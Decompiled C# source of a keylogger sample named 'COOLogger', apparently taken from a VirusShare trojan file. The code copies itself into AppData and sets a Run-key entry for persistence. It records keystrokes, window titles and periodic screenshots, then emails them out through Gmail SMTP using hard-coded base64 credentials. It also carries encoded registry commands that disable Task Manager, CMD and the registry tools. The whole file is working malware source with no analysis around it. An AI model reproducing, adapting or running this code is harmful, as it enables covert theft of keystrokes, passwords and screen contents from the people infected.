// Decompiled with JetBrains decompiler
// Type: NEdslVDFaDHVfzO
// Assembly: server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 43D2DA6E-E5A8-48CD-9FFE-4B8E608D710F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1d3c236e913c9bcc699c04be99e89b46d1529c91e20a675869c16f7b9bf84280.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class NEdslVDFaDHVfzO
{
  private static string BnOkjMtLwBaBMGY = "eW91cmVob3RzZXgyMUBnbWFpbC5jb20=";
  private static string VrOmeamESnbkIDg = "ODcybmRnNzIzOGoyMzQx";
  private static string iPjowmSbbZeCJQu = "smtp.gmail.com";
  private static int HHWadVtJClTWqTX = 587;
  private static string BaphSzCWyEScwKx;
  private static string kLhgJpHtxXxJDVS;
  private static string oLjbXjzPkYhFzdf;
  private static string MgltiOXYWbyGNqE;
  private static string DTXaRqGxiQSnQUi;
  private static string dSxHIGLvowanmDH;
  private static int RcWoYuepurDUiqr = 600000;
  private static string xUhvctgkKxvpIFb = (string) null;
  private static string GKNEdslVDFaDHVf = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";
  private static string zOBnOkjMtLwBaBM = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static string GYVrOmeamESnbkI = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static object lhReEEfnzcvbyRq = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string BZTwyflFNDidech = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage SZgwXXndfXwZECj = new MailMessage();
  private static SmtpClient pUFBoKzqFPxxkXx = new SmtpClient();
  [AccessedThroughProperty("RCwlGwnBMuthTuR")]
  private static UhvctgkKxvpIFbx _RCwlGwnBMuthTuR;
  private static object VgjyUVeojNcvPid;
  private static RichTextBox NpUFBoKzqFPxxkX;

  static NEdslVDFaDHVfzO()
  {
    NEdslVDFaDHVfzO.RCwlGwnBMuthTuR = new UhvctgkKxvpIFbx();
    NEdslVDFaDHVfzO.VgjyUVeojNcvPid = (object) Path.GetFileName(Application.ExecutablePath);
    NEdslVDFaDHVfzO.NpUFBoKzqFPxxkX = new RichTextBox();
  }

  private static UhvctgkKxvpIFbx RCwlGwnBMuthTuR
  {
    get => NEdslVDFaDHVfzO._RCwlGwnBMuthTuR;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (NEdslVDFaDHVfzO._RCwlGwnBMuthTuR != null)
        UhvctgkKxvpIFbx.KeyDown -= new UhvctgkKxvpIFbx.KeyDownEventHandler(NEdslVDFaDHVfzO.KNEdslVDFaDHVfz);
      NEdslVDFaDHVfzO._RCwlGwnBMuthTuR = value;
      if (NEdslVDFaDHVfzO._RCwlGwnBMuthTuR == null)
        return;
      UhvctgkKxvpIFbx.KeyDown += new UhvctgkKxvpIFbx.KeyDownEventHandler(NEdslVDFaDHVfzO.KNEdslVDFaDHVfz);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int MeqecWolIrDIEQh(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    NEdslVDFaDHVfzO.dSxHIGLvowanmDH = Conversions.ToString(true);
    NEdslVDFaDHVfzO.oLjbXjzPkYhFzdf = Conversions.ToString(false);
    NEdslVDFaDHVfzO.MgltiOXYWbyGNqE = Conversions.ToString(false);
    NEdslVDFaDHVfzO.DTXaRqGxiQSnQUi = Conversions.ToString(false);
    NEdslVDFaDHVfzO.kLhgJpHtxXxJDVS = Conversions.ToString(true);
    NEdslVDFaDHVfzO.BaphSzCWyEScwKx = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\WdtUUjZcUsWBygV.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(NEdslVDFaDHVfzO.BZTwyflFNDidech + "\\WdtUUjZcUsWBygV.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\"), NEdslVDFaDHVfzO.VgjyUVeojNcvPid))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\"), NEdslVDFaDHVfzO.VgjyUVeojNcvPid)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\"), NEdslVDFaDHVfzO.VgjyUVeojNcvPid)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\"), NEdslVDFaDHVfzO.VgjyUVeojNcvPid)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\"), NEdslVDFaDHVfzO.VgjyUVeojNcvPid)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(NEdslVDFaDHVfzO.BaphSzCWyEScwKx) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(NEdslVDFaDHVfzO.VgjyUVeojNcvPid))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(NEdslVDFaDHVfzO.VgjyUVeojNcvPid), Operators.ConcatenateObject(Operators.ConcatenateObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\"), NEdslVDFaDHVfzO.VgjyUVeojNcvPid));
    if (Conversions.ToBoolean(NEdslVDFaDHVfzO.kLhgJpHtxXxJDVS))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\WdtUUjZcUsWBygV.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(NEdslVDFaDHVfzO.oLjbXjzPkYhFzdf))
      Interaction.Shell(NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.GKNEdslVDFaDHVf), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(NEdslVDFaDHVfzO.MgltiOXYWbyGNqE))
      Interaction.Shell(NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.zOBnOkjMtLwBaBM), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(NEdslVDFaDHVfzO.DTXaRqGxiQSnQUi))
      Interaction.Shell(NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.GYVrOmeamESnbkI), AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 600000;
    timer1.Tick += new EventHandler(NEdslVDFaDHVfzO.drZqcgHusmFCYuT_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(NEdslVDFaDHVfzO.YVgjyUVeojNcvPi_Ticked);
    timer2.Start();
    NEdslVDFaDHVfzO.RCwlGwnBMuthTuR.WcYjmCXYirmQfyT();
    Application.Run();
  }

  private static string iEFOmTwMsySaQvq()
  {
    string lpString = new string(char.MinValue, 100);
    NEdslVDFaDHVfzO.MeqecWolIrDIEQh(NEdslVDFaDHVfzO.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string OBnOkjMtLwBaBMG(string uHHWadVtJClTWqT) => Encoding.ASCII.GetString(Convert.FromBase64String(uHHWadVtJClTWqT));

  public static void drZqcgHusmFCYuT_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(NEdslVDFaDHVfzO.dSxHIGLvowanmDH))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = NEdslVDFaDHVfzO.TlgVCKLJOyszdqp(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(NEdslVDFaDHVfzO.lhReEEfnzcvbyRq, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.BnOkjMtLwBaBMGY));
        message.To.Add(NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.BnOkjMtLwBaBMGY));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = NEdslVDFaDHVfzO.NpUFBoKzqFPxxkX.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.BnOkjMtLwBaBMGY), NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.VrOmeamESnbkIDg))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        NEdslVDFaDHVfzO.NpUFBoKzqFPxxkX.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage szgwXxndfXwZeCj = NEdslVDFaDHVfzO.SZgwXXndfXwZECj;
      szgwXxndfXwZeCj.From = new MailAddress(NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.BnOkjMtLwBaBMGY));
      szgwXxndfXwZeCj.To.Add(NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.BnOkjMtLwBaBMGY));
      szgwXxndfXwZeCj.Subject = "COOLogger Logs from - " + Environment.UserName;
      szgwXxndfXwZeCj.Body = NEdslVDFaDHVfzO.NpUFBoKzqFPxxkX.Text;
      SmtpClient pUfBoKzqFpxxkXx = NEdslVDFaDHVfzO.pUFBoKzqFPxxkXx;
      pUfBoKzqFpxxkXx.Host = "smtp.gmail.com";
      pUfBoKzqFpxxkXx.Port = 587;
      pUfBoKzqFpxxkXx.EnableSsl = true;
      pUfBoKzqFpxxkXx.Credentials = (ICredentialsByHost) new NetworkCredential(NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.BnOkjMtLwBaBMGY), NEdslVDFaDHVfzO.OBnOkjMtLwBaBMG(NEdslVDFaDHVfzO.VrOmeamESnbkIDg));
      pUfBoKzqFpxxkXx.Send(NEdslVDFaDHVfzO.SZgwXXndfXwZECj);
      NEdslVDFaDHVfzO.NpUFBoKzqFPxxkX.Text = "";
    }
  }

  public static void KNEdslVDFaDHVfz(Keys e) => NEdslVDFaDHVfzO.NpUFBoKzqFPxxkX.Text += NEdslVDFaDHVfzO.RCwlGwnBMuthTuR.lgVCKLJOyszdqpG(e);

  public static void YVgjyUVeojNcvPi_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(NEdslVDFaDHVfzO.xUhvctgkKxvpIFb, NEdslVDFaDHVfzO.iEFOmTwMsySaQvq(), false) == 0)
      return;
    NEdslVDFaDHVfzO.xUhvctgkKxvpIFb = NEdslVDFaDHVfzO.iEFOmTwMsySaQvq();
    if (Operators.CompareString(NEdslVDFaDHVfzO.xUhvctgkKxvpIFb, "", false) == 0)
      return;
    RichTextBox npUfBoKzqFpxxkX = NEdslVDFaDHVfzO.NpUFBoKzqFPxxkX;
    npUfBoKzqFpxxkX.Text = npUfBoKzqFpxxkX.Text + "\r\n\r\n~~~~~" + NEdslVDFaDHVfzO.xUhvctgkKxvpIFb + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string TlgVCKLJOyszdqp(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
